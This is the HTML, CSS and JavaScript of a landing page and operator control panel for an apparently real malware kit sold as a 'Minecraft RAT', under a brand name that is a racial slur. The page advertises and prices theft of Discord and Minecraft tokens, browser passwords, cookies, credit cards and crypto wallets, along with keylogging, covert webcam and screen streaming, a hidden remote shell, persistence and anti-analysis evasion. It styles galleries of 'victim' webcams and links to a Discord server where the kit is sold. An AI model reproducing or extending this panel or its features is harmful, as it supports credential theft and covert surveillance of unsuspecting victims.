            overflow: auto;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .modal-header {
            padding: 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-body {
            padding: 20px;
        }

        .modal-close {
            background: none;
            border: none;
            color: var(--text-secondary);
            cursor: pointer;
            font-size: 20px;
            transition: color 0.2s;
        }

        .modal-close:hover {
            color: var(--text-primary);
        }

        /* Screenshare Modal - Improved */
        .screenshare-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.95);
            z-index: 10000;
            flex-direction: column;
            backdrop-filter: blur(4px);
        }

        .screenshare-modal.active {
            display: flex;
            animation: fadeIn 0.2s ease;
        }

        .screenshare-modal-header {
            padding: 12px 20px;
            background: var(--bg-card);
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
            gap: 16px;
        }

        .screenshare-modal-title {
            display: flex;
            align-items: center;
            gap: 12px;
            color: var(--text-primary);
            font-weight: 600;
            flex-shrink: 0;
        }

        .screenshare-modal-status {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            flex-shrink: 0;
        }

        .screenshare-modal-status.streaming {
            color: #22c55e;
        }

        .screenshare-modal-status.stopped {
            color: var(--text-muted);
        }

        .screenshare-modal-header-controls {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .screenshare-modal-close {
            background: var(--danger);
            border: none;
            color: white;
            cursor: pointer;
            font-size: 14px;
            padding: 8px 16px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: all 0.2s;
        }

        .screenshare-modal-close:hover {
            background: #dc2626;
            transform: scale(1.05);
        }

        .screenshare-modal-body {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            padding: 20px;
            cursor: default;
            min-height: 0;
        }

        .screenshare-modal-image {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 8px;
            transition: opacity 0.15s ease;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
            image-rendering: -webkit-optimize-contrast;
            image-rendering: crisp-edges;
        }

        .screenshare-modal-controls {
            padding: 12px 20px;
            background: var(--bg-card);
            border-top: 1px solid var(--border);
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 16px;
            flex-shrink: 0;
            flex-wrap: wrap;
        }

        .screenshare-fps {
            position: absolute;
            bottom: 80px;
            right: 30px;
            background: rgba(0, 0, 0, 0.7);
            color: #22c55e;
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 12px;
            font-family: monospace;
            z-index: 10;
        }

        /* Volume Control */
        .volume-control {
            display: flex;
            align-items: center;
            gap: 8px;
            background: var(--bg-secondary);
            padding: 6px 12px;
            border-radius: 8px;
        }

        .volume-control i {
            color: var(--text-muted);
            font-size: 14px;
            cursor: pointer;
        }

        .volume-control i:hover {
            color: var(--text-primary);
        }

        .volume-slider {
            width: 100px;
            height: 4px;
            accent-color: var(--accent);
            cursor: pointer;
        }

        .volume-value {
            font-size: 11px;
            color: var(--text-muted);
            min-width: 30px;
            text-align: center;
        }

        .admin-only {
            display: none;
        }

        .is-admin .admin-only {
            display: flex;
        }

        /* Online Players */
        .online-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 16px;
        }

        .online-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 16px;
            transition: all 0.3s;
            animation: fadeIn 0.4s ease-out;
        }

        .online-card:hover {
            border-color: var(--accent);
            transform: translateY(-2px);
        }

        .online-card-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 12px;
        }

        .online-avatar {
            width: 48px;
            height: 48px;
            border-radius: 8px;
            background: var(--bg-secondary);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: var(--accent);
        }

        .online-status {
            width: 12px;
            height: 12px;
            background: var(--success);
            border-radius: 50%;
            animation: pulse 2s infinite;
            box-shadow: 0 0 10px var(--success);
        }

        .online-name {
            font-weight: 600;
            font-size: 16px;
        }

        .online-server {
            font-size: 13px;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .online-server i {
            color: var(--mc-green);
        }

        .online-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            font-size: 12px;
            color: var(--text-muted);
        }

        .online-info-item {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .online-count-badge {
            background: var(--success);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            animation: glow 2s infinite;
        }

        /* Webcam Gallery - Improved */
        .webcam-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
        }

        .webcam-card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 16px;
            overflow: hidden;
            transition: all 0.3s;
            animation: scaleIn 0.4s ease-out;
        }

        .webcam-card:hover {
            border-color: var(--accent);
            transform: scale(1.02);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
        }

        .webcam-card-header {
            padding: 12px 16px;
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .webcam-card-title {
            font-weight: 600;
            font-size: 13px;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .webcam-card-live {
            background: #ef4444;
            color: white;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .webcam-card-live i {
            animation: pulse 1s infinite;
            font-size: 6px;
        }

        .webcam-image {
            width: 100%;
            aspect-ratio: 16/9;
            object-fit: cover;
            background: var(--bg-secondary);
            cursor: pointer;
            transition: all 0.3s;
            display: block;
        }

        .webcam-image:hover {
            filter: brightness(1.1);
        }

        .webcam-info {
            padding: 12px 16px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }

        .webcam-victim {
            font-weight: 600;
            font-size: 13px;
            flex: 1;
            min-width: 120px;
            color: var(--text-primary);
        }

        .webcam-meta {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }

        .webcam-meta-item {
            font-size: 11px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .webcam-time {
            font-size: 11px;
            color: var(--text-muted);
        }

        .webcam-empty {
            text-align: center;
            padding: 80px 20px;
            color: var(--text-muted);
        }

        .webcam-empty i {
            font-size: 64px;
            margin-bottom: 20px;
            opacity: 0.4;
        }

        .webcam-badge {
            background: var(--bg-hover);
            padding: 4px 10px;
            border-radius: 6px;
            font-size: 11px;
            color: var(--text-secondary);
        }

        .webcam-actions {
            display: flex;
            gap: 8px;
            padding: 12px 16px;
            border-top: 1px solid var(--border);
            background: var(--bg-secondary);
        }

        .webcam-actions .btn {
            flex: 1;
            font-size: 12px;
            padding: 8px;
        }

        /* Lightbox */
        .lightbox {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 10000;
            align-items: center;
            justify-content: center;
        }

        .lightbox.active {
            display: flex;
            animation: fadeIn 0.2s;
        }

        .lightbox img {
            max-width: 95vw;
            max-height: 90vh;
            border-radius: 12px;
            box-shadow: 0 0 60px rgba(0, 0, 0, 0.5);
        }

        .lightbox-close {
            position: absolute;
            top: 20px;
            right: 30px;
            color: white;
            font-size: 36px;
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.2s;
        }

        .lightbox-close:hover {
            opacity: 1;
        }

        .lightbox-info {
            position: absolute;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--bg-card);
            padding: 16px 24px;
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 14px;
        }

        /* Nav item with badge */
        .nav-badge {
            background: var(--success);
            color: white;
            font-size: 10px;
            padding: 2px 6px;
            border-radius: 10px;
            margin-left: auto;
            animation: pulse 2s infinite;
        }

        /* Remote Control Styles */
        .remote-action-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 12px;
            margin-bottom: 24px;
        }

        .remote-action-btn {
            background: linear-gradient(135deg, var(--bg-card), var(--bg-hover));
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }

        .remote-action-btn:hover {
            border-color: var(--accent);
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.2);
        }

        .remote-action-btn i {
            font-size: 28px;
            color: var(--accent);
            margin-bottom: 12px;
            display: block;
        }

        .remote-action-btn span {
            font-size: 13px;
            color: var(--text-secondary);
        }

        /* Live Stream Container */
        .stream-container {
            background: #000;
            border: 2px solid var(--border);
            border-radius: 16px;
            overflow: hidden;
            position: relative;
        }

        .stream-container:hover {
            border-color: var(--accent);
        }

        .stream-live-badge {
            position: absolute;
            top: 16px;
            left: 16px;
            background: #ef4444;
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
            z-index: 10;
        }

        .stream-live-badge i {
            animation: pulse 1s infinite;
        }

        /* Shell Terminal */
        .terminal-container {
            background: #0d1117;
            border: 2px solid #30363d;
            border-radius: 12px;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
        }

        .terminal-header {
            background: #161b22;
            padding: 8px 16px;
            border-bottom: 1px solid #30363d;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .terminal-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .terminal-dot.red {
            background: #ff5f56;
        }

        .terminal-dot.yellow {
            background: #ffbd2e;
        }

        .terminal-dot.green {
            background: #27c93f;
        }

        .terminal-title {
            color: #8b949e;
            font-size: 12px;
            margin-left: 12px;
        }

        /* File Manager */
        .file-icon {
            font-size: 18px;
            margin-right: 8px;
        }

        .file-icon.folder {
            color: #f59e0b;
        }

        .file-icon.file {
            color: #60a5fa;
        }

        .file-row {
            cursor: pointer;
            transition: background 0.2s;
        }

        .file-row:hover {
            background: var(--bg-hover);
        }

        .breadcrumb-item {
            cursor: pointer;
            color: var(--text-secondary);
            transition: color 0.2s;
        }

        .breadcrumb-item:hover {
            color: var(--accent);
            text-decoration: underline;
        }

        .breadcrumb-item:hover {
            color: var(--accent);
            text-decoration: underline;
        }

        /* Privacy Blur */
        .blur-reveal {
            filter: blur(8px);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            user-select: none;
            opacity: 0.7;
        }

        .blur-reveal:hover {
            filter: blur(0);
            opacity: 1;
            user-select: text;
        }

        /* Chat & Soundboard Styles */
        .chat-container {
            display: flex;
            flex-direction: column;
            height: calc(100vh - 140px);
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            border: 1px solid var(--border);
            overflow: hidden;
        }

        .chat-messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .chat-msg {
            padding: 10px 14px;
            border-radius: 10px;
            max-width: 80%;
            font-size: 14px;
            line-height: 1.4;
        }

        .chat-msg.in {
            align-self: flex-start;
            background: rgba(0, 255, 157, 0.1);
            border-left: 3px solid var(--success);
            color: var(--text-primary);
        }

        .chat-msg.out {
            align-self: flex-end;
            background: rgba(88, 101, 242, 0.1);
            border-right: 3px solid #5865f2;
            color: var(--text-primary);
            text-align: right;
        }

        .chat-controls {
            padding: 16px;
            background: var(--bg-secondary);
            border-top: 1px solid var(--border);
            display: flex;
            gap: 12px;
        }

        .soundboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 20px;
        }

        .sound-btn {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 24px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
        }

        .sound-btn:hover {
            border-color: var(--accent);
            background: rgba(0, 255, 157, 0.05);
            transform: translateY(-2px);
        }

        .sound-btn i {
            font-size: 28px;
            color: var(--accent);
        }

        /* Custom Select Style */
        .glass-select {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid var(--border);
            color: white;
            padding: 10px 14px;
            border-radius: 8px;
            width: 100%;
            font-family: 'Inter', sans-serif;
            outline: none;
            cursor: pointer;
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 16px;
        }

        .glass-select:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 2px rgba(0, 255, 157, 0.2);
        }

        .glass-select option {
            background: #1a1a1a;
            color: white;
            padding: 10px;
        }
    </style>
    <script>
        // Define window.login immediately in HEAD so buttons can use it (safe and minimal)
        const API = '';
        let token = localStorage.getItem('token');

        window.login = async function () {
            console.log('Login attempt...');
            try {
                const usernameInput = document.getElementById('loginUsername');
                if (!usernameInput) {
                    alert('Input field not found!');
                    return;
                }
                const username = usernameInput.value;

                const res = await fetch(API + '/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({
                        'username': username,
                        'password': 'dummy',
                        'grant_type': 'password'
                    })
                }).then(r => r.json());

                if (res.access_token) {
                    token = res.access_token;
                    localStorage.setItem('token', token);

                    // If socket is already connected, authenticate it immediately
                    try {
                        if (typeof socket !== 'undefined' && socket && socket.connected) {
                            socket.emit('authenticate', { token: token });
                        }
                    } catch (e) { console.warn('Socket authenticate failed', e); }

                    // Fetch user info
                    const me = await fetch(API + '/api/auth/me', {
                        headers: { 'Authorization': 'Bearer ' + token }
                    }).then(r => r.json());

                    if (me.id) {
                        localStorage.setItem('user', JSON.stringify(me));
                        if (window.showApp) window.showApp();
                    }
                } else if (res.requires_admin_password) {
                    // Admin password required, no token yet
                    hideLoginModal();
                    showAdminPasswordModal();
                    return;
                } else {
                    const err = document.getElementById('loginError');
                    if (err) {
                        err.textContent = res.detail || res.error || 'Login failed';
                        err.style.display = 'block';
                    } else {
                        alert(res.detail || res.error || 'Login failed');
                    }
                }
            } catch (e) {
                console.error('Login error:', e);
                alert('Login failed: ' + e.message);
            }
        };
    </script>
</head>

<body>
    <!-- Landing Page -->
    <div class="login-container" id="loginPage">
        <!-- Navigation -->
        <nav class="landing-nav">
            <div class="landing-logo">
                <i class="fas fa-crown"></i>
                <span>Niggaware</span>
            </div>
            <div class="landing-nav-links">
                <a href="#features">Features</a>
                <a href="#pricing">Pricing</a>
                <a href="https://discord.gg/5UxrFAUp39" target="_blank" class="discord-btn">
                    <i class="fab fa-discord"></i> Join Discord
                </a>
                <a href="#" onclick="showLoginModal()"
                    style="background: var(--accent); color: #000; font-weight: 700;">
                    <i class="fas fa-sign-in-alt"></i> Login
                </a>
            </div>
        </nav>

        <!-- Hero Section -->
        <section class="hero-section">
            <div class="hero-content">
                <div class="hero-badge">
                    <i class="fas fa-bolt"></i>
                    <span>The Ultimate Minecraft RAT</span>
                </div>
                <h1 class="hero-title">Next Generation<br>Remote Access Tool</h1>
                <p class="hero-subtitle">
                    The most advanced Minecraft RAT with real-time control, Discord token grabbing,
                    browser data extraction, screen sharing, webcam access, and comprehensive remote administration.
                </p>
                <div class="hero-buttons">
                    <button class="hero-btn hero-btn-primary" onclick="showLoginModal()">
                        <i class="fas fa-rocket"></i> Get Started Free
                    </button>
                    <a href="https://discord.gg/5UxrFAUp39" target="_blank" class="hero-btn hero-btn-secondary">
                        <i class="fab fa-discord"></i> Join Community
                    </a>
                </div>
            </div>
        </section>

        <!-- Stats Section -->
        <section class="stats-section">
            <div class="stat-item">
                <div class="stat-number">10K+</div>
                <div class="stat-label">Active Users</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">500K+</div>
                <div class="stat-label">Tokens Grabbed</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">99.9%</div>
                <div class="stat-label">Uptime</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">24/7</div>
                <div class="stat-label">Support</div>
            </div>
        </section>

        <!-- Features Section -->
        <section class="features-section" id="features">
            <h2 class="section-title">Powerful Features</h2>
            <p class="section-subtitle">Everything you need for complete remote control and data extraction</p>

            <!-- Free Features -->
            <div style="margin-bottom: 60px;">
                <h3 style="text-align: center; color: var(--text-primary); margin-bottom: 30px; font-size: 1.8rem;">
                    <i class="fas fa-unlock"></i> Free Features
                </h3>
                <div class="features-grid">
                    <div class="feature-card">
                        <div class="feature-icon"><i class="fab fa-discord"></i></div>
                        <h3 class="feature-title">Discord Stealer</h3>
                        <p class="feature-desc">Token extraction, Account info (username, email, phone), Nitro & billing
                            status, Badge detection.</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon"><i class="fas fa-cube"></i></div>
                        <h3 class="feature-title">Minecraft Stealer</h3>
                        <p class="feature-desc">Session tokens, Alt accounts, Mod folder injection, Auto-persistence.
                        </p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon"><i class="fas fa-info-circle"></i></div>
                        <h3 class="feature-title">System Info</h3>
                        <p class="feature-desc">PC name & username, IP & geolocation, Hardware info, OS detection.</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon"><i class="fas fa-globe"></i></div>
                        <h3 class="feature-title">Browser Stealer (Basic)</h3>
                        <p class="feature-desc">Saved passwords, Cookies extraction, Autofill data, Credit cards.</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon"><i class="fas fa-wallet"></i></div>
                        <h3 class="feature-title">Crypto Wallets</h3>
                        <p class="feature-desc">MetaMask, Exodus, Atomic, Phantom, and many more.</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon"><i class="fas fa-file-export"></i></div>
                        <h3 class="feature-title">File Grabber</h3>
                        <p class="feature-desc">Custom extensions, Keyword search, Size limits, Auto-zip upload.</p>
                    </div>
                </div>
            </div>

            <!-- Premium Features -->
            <div style="margin-bottom: 60px;">
                <h3 style="text-align: center; color: var(--accent); margin-bottom: 30px; font-size: 1.8rem;">
                    <i class="fas fa-star"></i> Premium Features
                </h3>
                <div class="features-grid">
                    <div class="feature-card" style="border-color: var(--accent);">
                        <div class="feature-icon"><i class="fas fa-desktop"></i></div>
                        <h3 class="feature-title">Live Screenshare</h3>
                        <p class="feature-desc">Real-time viewing, WebSocket streaming (~12 FPS), Multi-monitor,
                            Screenshot history.</p>
                    </div>
                    <div class="feature-card" style="border-color: var(--accent);">
                        <div class="feature-icon"><i class="fas fa-video"></i></div>
                        <h3 class="feature-title">Live Webcam</h3>
                        <p class="feature-desc">Real-time stream, Audio capture, WebSocket (~10 FPS), Snapshot &
                            recording.</p>
                    </div>
                    <div class="feature-card" style="border-color: var(--accent);">
                        <div class="feature-icon"><i class="fas fa-globe"></i></div>
                        <h3 class="feature-title">Adv. Browser Stealer</h3>
                        <p class="feature-desc">App-Bound Encryption Bypass, Enhanced Cookies Extraction, More
                            Persistence.</p>
                    </div>
                    <div class="feature-card" style="border-color: var(--accent);">
                        <div class="feature-icon"><i class="fas fa-keyboard"></i></div>
                        <h3 class="feature-title">Keylogger</h3>
                        <p class="feature-desc">Real-time keystroke capture, Window title logging, Clipboard monitoring.
                        </p>
                    </div>
                    <div class="feature-card" style="border-color: var(--accent);">
                        <div class="feature-icon"><i class="fas fa-terminal"></i></div>
                        <h3 class="feature-title">Remote Shell</h3>
                        <p class="feature-desc">Full CMD access, PowerShell support, Hidden execution, Output streaming.
                        </p>
                    </div>
                    <div class="feature-card" style="border-color: var(--accent);">
                        <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
                        <h3 class="feature-title">Enhanced Persistence</h3>
                        <p class="feature-desc">Advanced registry keys, startup folder, task scheduler, hidden
                            attributes.</p>
                    </div>
                </div>
            </div>

            <!-- Technical Features -->
            <div>
                <h3 style="text-align: center; color: var(--text-secondary); margin-bottom: 30px; font-size: 1.8rem;">
                    <i class="fas fa-cogs"></i> Technical Features
                </h3>
                <div class="features-grid">
                    <div class="feature-card">
                        <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
                        <h3 class="feature-title">Stealth & Persistence</h3>
                        <p class="feature-desc">Anti-VM, Anti-debug, Registry persistence, Hidden startup, Process
                            hiding.</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon"><i class="fas fa-lock"></i></div>
                        <h3 class="feature-title">Security</h3>
                        <p class="feature-desc">AES-256 encryption, XOR obfuscation, String encryption, No window mode.
                        </p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon"><i class="fas fa-bolt"></i></div>
                        <h3 class="feature-title">Performance</h3>
                        <p class="feature-desc">Low CPU usage, Minimal memory, Auto-reconnect, Error recovery.</p>
                    </div>
                </div>
            </div>
        </section>

        <!-- Pricing Section -->
        <section class="pricing-section" id="pricing">
            <h2 class="section-title">Choose Your Plan</h2>
            <p class="section-subtitle">Start free and upgrade when you need more power</p>

            <!-- Holiday Banner -->
            <div
                style="background: linear-gradient(135deg, #d32f2f, #c62828); color: white; padding: 15px; border-radius: 12px; text-align: center; max-width: 600px; margin: 0 auto 40px; box-shadow: 0 5px 20px rgba(211, 47, 47, 0.4); animation: pulse 2s infinite;">
                <i class="fas fa-gift"></i> <strong>CHRISTMAS SALE:</strong> 50% OFF ALL PLANS! Limited Time Only
            </div>

            <div class="pricing-grid">
                <!-- Free Plan -->
                <div class="pricing-card">
                    <div class="pricing-name">Free</div>
                    <div class="pricing-price">$0<span>/forever</span></div>
                    <ul class="pricing-features">
                        <li><i class="fas fa-check"></i> Discord Stealer (Basic)</li>
                        <li><i class="fas fa-check"></i> Minecraft Stealer</li>
                        <li><i class="fas fa-check"></i> Browser Stealer (Basic)</li>
                        <li><i class="fas fa-check"></i> Crypto Wallets</li>
                        <li><i class="fas fa-check"></i> File Grabber</li>
                        <li class="disabled"><i class="fas fa-times"></i> Live Screenshare</li>
                        <li class="disabled"><i class="fas fa-times"></i> Live Webcam</li>
                        <li class="disabled"><i class="fas fa-times"></i> Remote Shell</li>
                        <li class="disabled"><i class="fas fa-times"></i> Adv. Persistence</li>
                    </ul>
                    <button class="pricing-btn pricing-btn-secondary" onclick="showLoginModal()">
                        Get Started Free
                    </button>
                </div>
                <!-- Premium Plan -->
                <div class="pricing-card featured">
                    <div class="pricing-name">Premium</div>
                    <div class="pricing-price"
                        style="display: flex; flex-direction: column; align-items: center; gap: 5px;">
                        <div>
                            <span
                                style="text-decoration: line-through; color: var(--text-muted); font-size: 1.5rem;">10</span>
                            <span style="color: var(--accent);">5</span><span>/month</span>
                        </div>
                        <div style="font-size: 0.9rem; color: var(--mc-green);">
                            OR <span style="text-decoration: line-through; color: var(--text-muted);">20</span>
                            <strong>10 Lifetime</strong>
                        </div>
                    </div>
                    <ul class="pricing-features">
                        <li><i class="fas fa-check"></i> <strong>Everything in Free</strong></li>
                        <li><i class="fas fa-check"></i> <strong>Adv. Browser Stealer</strong> (App-Bound Bypass)</li>
                        <li><i class="fas fa-check"></i> <strong>Adv. Persistence</strong></li>
                        <li><i class="fas fa-check"></i> <strong>Live Screen & Webcam</strong></li>
                        <li><i class="fas fa-check"></i> <strong>Audio Capture & Keylogger</strong></li>
                        <li><i class="fas fa-check"></i> <strong>Remote Shell & File Manager</strong></li>
                        <li><i class="fas fa-check"></i> <strong>Live Map & Multi-User</strong></li>
                        <li><i class="fas fa-check"></i> Priority Support</li>
                    </ul>
                    <button class="pricing-btn pricing-btn-primary"
                        onclick="window.open('https://discord.gg/5UxrFAUp39', '_blank')">
                        <i class="fab fa-discord"></i> Buy on Discord
                    </button>
                </div>
            </div>
        </section>

        <!-- Discord CTA -->
        <section style="padding: 80px 40px; text-align: center; position: relative; z-index: 1;">
            <h2 class="section-title">Join Our Community</h2>
            <p class="section-subtitle" style="margin-bottom: 30px;">Get support, updates, and connect with other users
            </p>
            <a href="https://discord.gg/5UxrFAUp39" target="_blank" class="hero-btn"
                style="background: linear-gradient(135deg, #5865f2, #7c3aed); color: white; padding: 20px 40px; font-size: 1.2rem;">
                <i class="fab fa-discord" style="font-size: 1.5rem;"></i> Join Discord Server
            </a>
        </section>

        <!-- Footer -->
        <footer
            style="padding: 40px; text-align: center; border-top: 1px solid rgba(255,255,255,0.05); position: relative; z-index: 1;">
            <p style="color: var(--text-muted);"> 2026 Niggaware. Educational purposes only.</p>
        </footer>
    </div>

    <!-- Login Modal -->
    <div class="login-modal" id="loginModal">
        <div class="login-box">
            <div class="login-logo">
                <i class="fas fa-crown"></i>
                <h1>Niggaware Premium</h1>
                <p>Premium Control Panel</p>
            </div>
            <button onclick="hideLoginModal()"
                style="position: absolute; top: 15px; right: 20px; background: none; border: none; color: var(--text-secondary); font-size: 1.5rem; cursor: pointer;">&times;</button>
            <div class="error-msg" id="loginError"></div>
            <div class="form-group">
                <label><i class="fas fa-id-card"></i> Account ID</label>
                <input type="text" id="loginUsername" placeholder="Enter your Account ID"
                    onkeypress="if(event.key==='Enter'&&window.login)window.login()">
            </div>
            <button class="btn btn-primary" style="width: 100%;"
                onclick="if(window.login)window.login();else alert('Login function not ready')">
                <i class="fas fa-sign-in-alt"></i> Login
            </button>
            <div class="register-link">
                Need an account? <a href="#" onclick="register()"
                    style="color: var(--accent); text-decoration: none; font-weight: bold;">Create Free Account</a>
            </div>
        </div>
    </div>

    <!-- Admin Password Modal -->
    <div class="login-modal" id="adminPasswordModal">
        <div class="login-box">
            <div class="login-logo">
                <i class="fas fa-shield-alt" style="color: #ef4444;"></i>
                <h1>Admin Verification</h1>
                <p>Enter Admin Password</p>
            </div>
            <button onclick="hideAdminPasswordModal(); localStorage.removeItem('token');"
                style="position: absolute; top: 15px; right: 20px; background: none; border: none; color: var(--text-secondary); font-size: 1.5rem; cursor: pointer;">&times;</button>
            <div class="error-msg" id="adminPasswordError"></div>
            <div class="form-group">
                <label><i class="fas fa-lock"></i> Admin Password</label>
                <input type="password" id="adminPasswordInput" placeholder="Enter admin password"
                    onkeypress="if(event.key==='Enter')verifyAdminPassword()">
            </div>
            <button class="btn btn-primary" style="width: 100%; background: linear-gradient(135deg, #ef4444, #dc2626);"
                onclick="verifyAdminPassword()">
                <i class="fas fa-key"></i> Verify
            </button>
        </div>
    </div>

    <script>
        function showLoginModal() {
            document.getElementById('loginModal').classList.add('active');
        }
        function hideLoginModal() {
            document.getElementById('loginModal').classList.remove('active');
        }
        function showAdminPasswordModal() {
            document.getElementById('adminPasswordModal').classList.add('active');
        }
        function hideAdminPasswordModal() {
            document.getElementById('adminPasswordModal').classList.remove('active');
            document.getElementById('adminPasswordInput').value = '';
            document.getElementById('adminPasswordError').style.display = 'none';
        }

        async function verifyAdminPassword() {
            const password = document.getElementById('adminPasswordInput').value;
            const errEl = document.getElementById('adminPasswordError');

            if (!password) {
                errEl.textContent = 'Please enter the admin password';
                errEl.style.display = 'block';
                return;
            }

            try {
                // Call LOGIN endpoint again with the password
                const username = document.getElementById('loginUsername').value || "B3xon16#12";

                const res = await fetch(API + '/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({
                        'username': username,
                        'password': password,
                        'grant_type': 'password'
                    })
                }).then(r => r.json());

                if (res.access_token) {
                    token = res.access_token;
                    localStorage.setItem('token', token);
                    hideAdminPasswordModal();

                    // Socket
                    try {
                        if (typeof socket !== 'undefined' && socket && socket.connected) {
                            socket.emit('authenticate', { token: token });
                        }
                    } catch (e) { }

                    // Fetch user info and show app
                    const me = await fetch(API + '/api/auth/me', {
                        headers: { 'Authorization': 'Bearer ' + token }
                    }).then(r => r.json());

                    if (me.id) {
                        localStorage.setItem('user', JSON.stringify(me));
                        if (window.showApp) window.showApp();
                    }
                }
            } catch (e) {
                errEl.textContent = 'Verification failed: ' + e.message;
                errEl.style.display = 'block';
            }
        }

        // Close modal on outside click
        document.getElementById('loginModal')?.addEventListener('click', function (e) {
            if (e.target === this) hideLoginModal();
        });
        document.getElementById('adminPasswordModal')?.addEventListener('click', function (e) {
            if (e.target === this) {
                hideAdminPasswordModal();
                localStorage.removeItem('token');
            }
        });
    </script>

    <!-- App -->
    <canvas id="cyber-canvas"></canvas>
    <div class="app" id="app">
        <aside class="sidebar">
            <div class="sidebar-logo">
                <i class="fas fa-crown" style="color: var(--accent); filter: drop-shadow(0 0 5px var(--accent));"></i>
                <span
                    style="background: linear-gradient(to right, #fff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800;">Niggaware
                    Premium</span>
            </div>
            <!-- Snowdrops removed -->
            <nav>
                <div class="nav-item active" onclick="showPage('dashboard')" id="nav-dashboard">
                    <i class="fas fa-home"></i> Dashboard
                </div>
                <div class="nav-item" onclick="showPage('chat')" id="nav-chat">
                    <i class="fas fa-comments"></i> Ghost Chat
                </div>
                <div class="nav-item" onclick="showPage('soundboard')" id="nav-soundboard">
                    <i class="fas fa-volume-up"></i> Soundboard
                </div>
                <div class="nav-item" onclick="showPage('online')" id="nav-online">
                    <i class="fas fa-signal"></i> Online Players
                    <span class="nav-badge" id="onlineCountBadge">0</span>
                </div>
                <div class="nav-item" onclick="showPage('builder')" id="nav-builder">
                    <i class="fas fa-hammer"></i> Builder
                </div>
